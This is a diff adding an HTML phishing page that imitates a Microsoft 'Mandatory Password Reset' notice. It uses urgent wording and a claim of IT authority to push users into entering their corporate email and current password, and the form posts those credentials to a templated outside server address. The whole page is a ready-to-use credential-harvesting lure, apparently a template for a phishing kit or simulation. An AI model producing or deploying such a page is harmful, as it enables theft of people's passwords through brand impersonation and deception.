@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Mandatory Password Reset</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f3f6f4; }
+        .container { 
+            width: 450px; margin: 50px auto; background: white;
+            padding: 30px; border-radius: 3px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .microsoft-logo { width: 160px; margin-bottom: 20px; }
+        .warning { color: #d83b01; font-weight: 600; margin: 15px 0; }
+        input { width: 100%; padding: 8px; margin: 8px 0; }
+        .submit-btn { background: #0078d4; color: white; padding: 10px; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://example.com/microsoft-logo.png" class="microsoft-logo" alt="Microsoft">
+        <div class="warning">URGENT: System Password Rotation Required</div>
+        <p>Due to recent security upgrades, you must reset your password immediately.</p>
+        <form method="POST" action="{{server_ip}}/submit">
+            <input type="hidden" name="email" value="{{email}}">
+            <input type="text" name="username" placeholder="Corporate Email" required>
+            <input type="password" name="password" placeholder="Current Password" required>
+            <button type="submit" class="submit-btn">Reset Password</button>
+        </form>
+        <p style="font-size: 0.8em; color: #666;">
+            This action is required by IT Department. If you have any questions, please contact your IT Administrator.
+        </p>
+    </div>
+</body>
+</html>
